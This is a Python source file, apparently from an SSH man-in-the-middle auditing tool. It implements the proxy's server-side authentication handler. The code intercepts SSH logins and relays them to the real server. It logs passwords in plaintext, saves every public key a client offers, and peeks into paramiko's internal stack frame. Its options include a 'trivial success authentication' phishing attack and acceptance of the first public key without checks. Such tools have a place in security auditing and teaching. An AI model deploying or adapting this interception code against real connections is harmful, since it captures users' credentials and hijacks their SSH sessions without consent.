import inspect
import logging
import os
from typing import TYPE_CHECKING, List, Optional, Union

import paramiko
from paramiko.pkey import PKey

from sshmitm.core.interfaces.server import ServerInterface

if TYPE_CHECKING:
    import sshmitm
    from sshmitm.core.authentication import RemoteCredentials


class MitmServerInterface(ServerInterface):

    def __init__(self, session: "sshmitm.core.session.Session") -> None:
        super().__init__(session)
        self.possible_auth_methods: Optional[List[str]] = None

    @classmethod
    def parser_arguments(cls) -> None:
        logging.error("create mitm group")
        super().parser_arguments()
        plugin_group = cls.argument_group()
        plugin_group.add_argument(
            "--disable-password-auth",
            dest="disable_password_auth",
            action="store_true",
            help="Disables password-based authentication, forcing clients to use alternative authentication methods.",
        )
        plugin_group.add_argument(
            "--disable-publickey-auth",
            dest="disable_pubkey_auth",
            action="store_true",
            help="Disables public key authentication. Note that this is not RFC-4252 compliant.",
        )
        plugin_group.add_argument(
            "--disallow-publickey-auth",
            dest="disallow_publickey_auth",
            action="store_true",
            help="Disallows public key authentication but still verifies whether public key authentication would be possible.",
        )
        plugin_group.add_argument(
            "--disable-keyboard-interactive-prompts",
            dest="disable_keyboard_interactive_prompts",
            action="store_true",
            help="Disables prompts for keyboard-interactive authentication, preventing interactive authentication challenges.",
        )
        plugin_group.add_argument(
            "--disable-auth-method-lookup",
            dest="disable_auth_method_lookup",
            action="store_true",
            help="Disables the lookup of supported authentication methods on the remote server during the authentication process.",
        )

        plugin_group.add_argument(
            "--enable-none-auth",
            dest="enable_none_auth",
            action="store_true",
            help='Enables "none" authentication, which allows connections without any authentication.',
        )
        plugin_group.add_argument(
            "--enable-keyboard-interactive-auth",
            dest="enable_keyboard_interactive_auth",
            action="store_true",
            help='Enables "keyboard-interactive" authentication, allowing interactive authentication prompts.',
        )
        plugin_group.add_argument(
            "--enable-trivial-auth",
            dest="enable_trivial_auth",
            action="store_true",
            help='Enables "trivial success authentication" phishing attack, which simulates a successful authentication without actual validation.',
        )

        plugin_group.add_argument(
            "--accept-first-publickey",
            dest="accept_first_publickey",
            action="store_true",
            help="Accepts the first public key provided by the client without checking if the user is allowed to log in using public key authentication.",
        )
        plugin_group.add_argument(
            "--extra-auth-methods",
            dest="extra_auth_methods",
            help="Specifies additional authentication method names that are supported by the server.",
        )

    def get_allowed_auths(self, username: str) -> str:
        logging.debug("get_allowed_auths: username=%s", username)
        if (
            self.possible_auth_methods is None
            and not self.args.disable_auth_method_lookup
        ):
            creds: RemoteCredentials = (
                self.session.authenticator.get_remote_host_credentials(username)
            )
            if creds.host is not None and creds.port is not None:
                try:
                    self.possible_auth_methods = (
                        self.session.authenticator.get_auth_methods(
                            creds.host, creds.port, username
                        )
                    )
                    logging.info(
                        "Remote auth-methods: %s", str(self.possible_auth_methods)
                    )
                except paramiko.ssh_exception.SSHException as ex:
                    self.session.remote_address_reachable = False
                    logging.error(ex)
                    return "publickey"
        allowed_auths = []
        if self.args.extra_auth_methods:
            allowed_auths.extend(self.args.extra_auth_methods.split(","))
        if self.args.enable_keyboard_interactive_auth or self.args.enable_trivial_auth:
            allowed_auths.append("keyboard-interactive")
        if not self.args.disable_pubkey_auth:
            allowed_auths.append("publickey")
        if not self.args.disable_password_auth:
            allowed_auths.append("password")
        if allowed_auths or self.args.enable_none_auth:
            allowed_authentication_methods = ",".join(allowed_auths)
            logging.debug(
                "Allowed authentication methods: %s", allowed_authentication_methods
            )
            return allowed_authentication_methods
        logging.warning('Authentication is set to "none", but logins are disabled!')
        return "none"

    def check_auth_none(self, username: str) -> int:
        logging.debug("check_auth_none: username=%s", username)
        if self.args.enable_none_auth:
            self.session.authenticator.authenticate(username, key=None)
            return paramiko.common.AUTH_SUCCESSFUL
        return paramiko.common.AUTH_FAILED

    def check_auth_publickey(self, username: str, key: PKey) -> int:

        # Attempt to access the internal 'sig_attached' variable from Paramiko's
        # authentication handler. This variable indicates whether the SSH public key
        # authentication request includes an attached signature.
        sig_attached: Optional[bool]

        # Retrieve the current stack frame.
        current_frame = inspect.currentframe()

        # Access the parent frame (the caller of this function) and try to get the local
        # variable 'sig_attached' from it.
        sig_attached = current_frame.f_back.f_locals.get("sig_attached")

        # Log detailed information about the current authentication attempt:
        # - username: SSH username being authenticated
        # - key: SSH public key object
        # - key name, fingerprint, and bit length
        # - sig_attached: whether a signature is attached to the authentication request
        logging.info(
            "check_auth_publickey: username=%s, key=%s %s %sbits, sig_attached=%s",
            username,
            key.get_name(),
            key.fingerprint,
            key.get_bits(),
            sig_attached,
        )

        # If 'sig_attached' could not be retrieved, the current version of Paramiko
        # likely does not expose this variable as expected. Raise an exception to
        # indicate that the installed Paramiko version is not compatible.
        if sig_attached is None:
            error_message = (
                "Unable to get 'sig_attached' variable from Paramiko's "
                "AuthHandler._parse_userauth_request. Paramiko version not compatible."
            )
            raise paramiko.ssh_exception.AuthenticationException(error_message)

        if self.session.session_log_dir:
            os.makedirs(self.session.session_log_dir, exist_ok=True)
            pubkeyfile_path = os.path.join(self.session.session_log_dir, "publickeys")
            with open(pubkeyfile_path, "a+", encoding="utf-8") as pubkeyfile:
                pubkeyfile.write(
                    f"{key.get_name()} {key.get_base64()} saved-from-auth-publickey\n"
                )
        if self.args.disable_pubkey_auth:
            logging.debug("Publickey login attempt, but publickey auth was disabled!")
            return paramiko.common.AUTH_FAILED
        if self.args.accept_first_publickey:
            logging.debug("host probing disabled - first key accepted")
            if self.args.disallow_publickey_auth:
                logging.debug(
                    "ignoring argument --disallow-publickey-auth, first key still accepted"
                )
            self.session.authenticator.authenticate(username, key=None)
            self.session.authenticator.accepted_key = key
            return paramiko.common.AUTH_SUCCESSFUL
        if not self.session.remote_address_reachable:
            return paramiko.common.AUTH_FAILED

        auth_result: int = self.session.authenticator.authenticate(username, key=key)
        if auth_result == paramiko.common.AUTH_SUCCESSFUL:
            self.session.authenticator.accepted_key = key
        if (
            self.session.authenticator.accepted_key is not None
            and self.args.enable_trivial_auth
        ):
            logging.debug("found valid key for trivial authentication")
            return paramiko.common.AUTH_FAILED
        if self.args.disallow_publickey_auth:
            return paramiko.common.AUTH_FAILED
        return auth_result

    def check_auth_interactive(
        self, username: str, submethods: Union[bytes, str]
    ) -> Union[int, paramiko.server.InteractiveQuery]:
        logging.debug(
            "check_auth_interactive: username=%s, submethods=%s", username, submethods
        )
        is_trivial_auth = (
            self.args.enable_trivial_auth
            and self.session.authenticator.accepted_key is not None
        )
        logging.debug("trivial authentication possible")
        if not self.args.enable_keyboard_interactive_auth and not is_trivial_auth:
            return paramiko.common.AUTH_FAILED
        self.session.username = username
        auth_interactive_query = paramiko.server.InteractiveQuery()
        if not self.args.disable_keyboard_interactive_prompts and not is_trivial_auth:
            auth_interactive_query.add_prompt("Password (kb-interactive): ", False)
        return auth_interactive_query

    def check_auth_interactive_response(
        self, responses: List[str]
    ) -> Union[int, paramiko.server.InteractiveQuery]:
        logging.debug("check_auth_interactive_response: responses=%s", responses)
        is_trivial_auth = (
            self.args.enable_trivial_auth
            and self.session.authenticator.accepted_key is not None
        )
        if self.args.disable_keyboard_interactive_prompts or is_trivial_auth:
            self.session.authenticator.authenticate(self.session.username, key=None)
            return paramiko.common.AUTH_SUCCESSFUL
        if not responses:
            return paramiko.common.AUTH_FAILED
        return self.session.authenticator.authenticate(
            self.session.username, password=responses[0]
        )

    def check_auth_password(self, username: str, password: str) -> int:
        logging.debug(
            "check_auth_password: username=%s, password=%s", username, password
        )
        if self.args.disable_password_auth:
            logging.warning("Password login attempt, but password auth was disabled!")
            return paramiko.common.AUTH_FAILED
        if not self.session.remote_address_reachable:
            return paramiko.common.AUTH_FAILED
        return self.session.authenticator.authenticate(username, password=password)
